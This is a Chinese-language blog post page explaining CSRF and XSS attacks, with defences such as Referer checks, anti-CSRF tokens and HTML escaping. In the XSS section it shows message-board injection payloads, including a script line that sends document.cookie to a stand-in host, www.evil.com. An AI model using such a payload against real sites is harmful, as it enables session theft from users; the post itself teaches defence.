@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="网络安全," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="CSRF 与 XSS 都为跨站式的请求攻击容易让人混淆，本文将对这两种攻击及对应防范方法进行梳理。">
+<meta name="keywords" content="网络安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF 与 XSS">
+<meta property="og:url" content="https://ccwindy.github.io/csrf-and-xss/index.html">
+<meta property="og:site_name" content="CCWindy&#39;s Blog">
+<meta property="og:description" content="CSRF 与 XSS 都为跨站式的请求攻击容易让人混淆，本文将对这两种攻击及对应防范方法进行梳理。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-09-05T07:47:49.191Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSRF 与 XSS">
+<meta name="twitter:description" content="CSRF 与 XSS 都为跨站式的请求攻击容易让人混淆，本文将对这两种攻击及对应防范方法进行梳理。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://ccwindy.github.io/csrf-and-xss/"/>
+
+
+
+
+
+  <title>CSRF 与 XSS | CCWindy's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CCWindy's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ccwindy.github.io/csrf-and-xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Windy Chan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CCWindy's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CSRF 与 XSS</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-21T00:00:00+08:00">
+                2018-08-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>CSRF 与 XSS 都为跨站式的请求攻击容易让人混淆，本文将对这两种攻击及对应防范方法进行梳理。</p>
+<a id="more"></a>
+<h3 id="CSRF-Cross-Site-Request-Forgery-跨站请求伪造"><a href="#CSRF-Cross-Site-Request-Forgery-跨站请求伪造" class="headerlink" title="CSRF (Cross-Site Request Forgery) 跨站请求伪造"></a>CSRF (Cross-Site Request Forgery) 跨站请求伪造</h3><p>攻击者盗用了用户的身份以用户的名义进行恶意请求，如发送邮件、银行转账等。</p>
+<p>如用户 A 在 example 网站上进行转账，通过 <a href="http://example.com/withdraw?user=A&amp;amount=100" target="_blank" rel="noopener">http://example.com/withdraw?user=A&amp;amount=100</a> 进行转账请求并携带存储在浏览器的相关验证信息如 cookie ，服务器通过对 cookie 的验证确认用户信息完成转账。</p>
+<p>若 A 在保持 example 网站登录时访问了恶意网站，并被引诱点击链接 <a href="http://example.com/withdraw?user=A&amp;amount=100" target="_blank" rel="noopener">http://example.com/withdraw?user=A&amp;amount=100</a> ，因浏览器关于此网站的相关验证信息还没过期，该请求也携带相关验证信息对服务器进行请求，服务器通过对验证信息的确认认为用户身份没有问题也完成转账。</p>
+<p>由此攻击者利用服务器对浏览器的信任成功盗用用户 A 的身份进行银行转账。</p>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><h4 id="1-使用-HTTP-头部的REFERER字段"><a href="#1-使用-HTTP-头部的REFERER字段" class="headerlink" title="1. 使用 HTTP 头部的REFERER字段"></a>1. 使用 HTTP 头部的REFERER字段</h4><p>请求头中的 REFERER 字段记录了请求来源的地址，在处理敏感信息时一般将请求地址与 Referer 字段处于同一域名下，服务器可以通过对 REFERER 值判断该请求是否正常。从恶意网站中被引诱点击的请求 REFERER 值为该恶意网站，由此服务器可以拒绝此请求。
+此方式简单易用，仅需要在服务器判断 REFERER 字段值即可。然而虽然 HTTP 协议规定了不可对 REFERER 字段进行修改，实际上并不能保证浏览器的具体实现，有些低级浏览器的安全漏洞也使得攻击者对 REFERER 字段进行修改。</p>
+<h4 id="2-使用验证码"><a href="#2-使用验证码" class="headerlink" title="2. 使用验证码"></a>2. 使用验证码</h4><p>验证码强制用户必须参与请求交互，通常情况下可以很好防止 CSRF 攻击。但出于用户体验的考虑，一个网站并不可能每个请求都需要用户输入验证码。此方法只能作为协助手段，并不能通用解决 CSRF 问题。</p>
+<h4 id="3-使用-Anti-CSRF-Token-验证"><a href="#3-使用-Anti-CSRF-Token-验证" class="headerlink" title="3. 使用 Anti CSRF Token 验证"></a>3. 使用 Anti CSRF Token 验证</h4><p>CSRF 攻击者利用了存储在浏览器的验证信息通过服务器验证，其实只要验证信息不直接存储在浏览器中即可防范。
+服务器可以使用 cookie 或 Session 携带验证信息的 token ，但直接使用 cookie 或 Session 进行请求并不能通过服务器验证，而是需要客户端获取 cookie 或 Session 中 token 信息并在请求头设置验证字段发送请求。
+浏览器的同源策略使得处于不同域名下的恶意网站并不能获取分析浏览器中的 cookie 或 Session 信息，从而不能设置具体的请求验证字段通过服务器验证。
+此方法最为常用。</p>
+<h3 id="XSS-Cross-site-scripting-跨站脚本"><a href="#XSS-Cross-site-scripting-跨站脚本" class="headerlink" title="XSS (Cross-site scripting) 跨站脚本"></a>XSS (Cross-site scripting) 跨站脚本</h3><p>攻击者利用网页开始时留下的漏洞，通过巧妙的方法往网页中注入恶意代码，使用户加载和执行这些恶意代码从而达到网页攻击的作用，如修改网页内容，盗取网站 cookie 或会话信息等。</p>
+<p>如一个网站上有留言板，将用户输入信息显示出来，若不对输入信息进行处理，攻击者便有机会往留言板写入恶意 JS 代码进行攻击。
+正常用户往留言板留言：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nice!</span><br></pre></td></tr></table></figure></p>
+<p>留言板的 HTML 代码将为：
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//  这是一个正常显示的留言板</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> </span><br><span class="line">    Nice</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>恶意攻击者往留言板留言：
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('you are attacked!');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>留言板的 HTML 代码将为：
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--  这是一个被攻击的留言板 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('you are attacked!');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>其中的 JS 代码将会执行，浏览器弹出对话框显示 you are attacked!。这只是弹出对话框吓一下你，然而当攻击者通过留言获取网站的 cookie 信息就危险了：
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">window.open(www.evil.com?content=document.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><a href="http://www.evil.com" target="_blank" rel="noopener">www.evil.com</a> 便可得到用户在该网站的 cookie 信息了。</p>
+<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><h4 id="1-对输入值进行转义"><a href="#1-对输入值进行转义" class="headerlink" title="1. 对输入值进行转义"></a>1. 对输入值进行转义</h4><p>其实本质就是不相信任何用户输入，不能将用户输入直接写到 HMLT DOM 结果里。若网站开发者将留言板的输入信息过滤掉<scirpt>这个 HTML 元素，其中的 JS 代码将不会被浏览器解析危害用户了。开发者可使用以下<a href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" target="_blank" rel="noopener">规则</a>对输入值进行转义：</scirpt></p>
+<table>
+<thead>
+<tr>
+<th>转义类型</th>
+<th>转义方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTML 实体转义</td>
+<td>&amp; 转为  &amp;amp; <br> &lt; 转为 &amp;lt; <br> &gt; 转为 &amp;gt; <br> &quot; 转为 &amp;quot; <br> &#27; 转为 &amp;#27; <br> &#x2F; 转为 &amp;#x2F;</td>
+</tr>
+<tr>
+<td>HTML 属性编码</td>
+<td>除了字母，转换所有字符为 &amp;#xHH; 形式，包括空格（HH = Hex 数值）</td>
+</tr>
+<tr>
+<td>URL 编码</td>
+<td>URL编码应该只用于参数部分，而不是整个URL或URL路径部分。<br> 标准的编码可参考 <a href="http://www.w3schools.com/tags/ref_urlencode.asp" target="_blank" rel="noopener">http://www.w3schools.com/tags/ref_urlencode.asp</a></td>
+</tr>
+<tr>
+<td>JavaScript 编码</td>
+<td>除了字母，转换所有字符为 \uXXXX 的 unicode 转义形式（X = 整数）</td>
+</tr>
+<tr>
+<td>CSS Hex 编码</td>
+<td>CSS 转义支持 \XX 和 \XXXXXX 的形式。如果下一个字符会继续转义序列，那使用两个字符的转义形式可能会出现问题。<br> 有两种解决办法（a）在 CSS 转义后添加一个空格（会被 CSS 解析器忽略）（b）使用0填充以实现完整的 CSS 转义格式。</td>
+</tr>
+</tbody>
+</table>
+<p>如用户输入内容是：
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('attacked!');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>转义后的字符串是：
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;script&amp;gt;alert(&amp;quot;attacked!&amp;quot;)&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure></p>
+<p>浏览器遇到 <script></script> 字符串会对其进行 JS 代码解析，但遇到 <code>&amp;lt;&amp;gt;</code> 这样的字符就不会当做 JS 代码执行而仅作为普通字符串打印，由此可以防范代码注入。
+当今的主流前端框架如 <a href="https://angular.cn/guide/security" target="_blank" rel="noopener">Angular</a> 等已支持对输入值的无公害处理以防范 XSS ，使用这些框架我们则不需要自己对输入信息进行转义。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>可以说 XSS 利用的是用户对指定网站的信任; CSRF 利用的是网站对用户网页浏览器的信任。
+使用对应的手段可以防御一定的网络攻击，但作为开发者，我们也只能尽可能提高网络攻击的难度，没有一定安全的网络。只有进一步提高攻击者的门槛使得网络逼近绝对安全的位置。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/网络安全/" rel="tag"># 网络安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/process-of-web-request/" rel="next" title="网页请求过程">
+                <i class="fa fa-chevron-left"></i> 网页请求过程
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/webpack-tree-shaking/" rel="prev" title="Webpack打包方式">
+                Webpack打包方式 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Windy Chan</p>
+              <p class="site-description motion-element" itemprop="description">Blog is how I learn.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF-Cross-Site-Request-Forgery-跨站请求伪造"><span class="nav-number">1.</span> <span class="nav-text">CSRF (Cross-Site Request Forgery) 跨站请求伪造</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#防御"><span class="nav-number">1.1.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-使用-HTTP-头部的REFERER字段"><span class="nav-number">1.2.</span> <span class="nav-text">1. 使用 HTTP 头部的REFERER字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-使用验证码"><span class="nav-number">1.3.</span> <span class="nav-text">2. 使用验证码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-使用-Anti-CSRF-Token-验证"><span class="nav-number">1.4.</span> <span class="nav-text">3. 使用 Anti CSRF Token 验证</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS-Cross-site-scripting-跨站脚本"><span class="nav-number">2.</span> <span class="nav-text">XSS (Cross-site scripting) 跨站脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#防御-1"><span class="nav-number">2.1.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-对输入值进行转义"><span class="nav-number">2.2.</span> <span class="nav-text">1. 对输入值进行转义</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Windy Chan</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
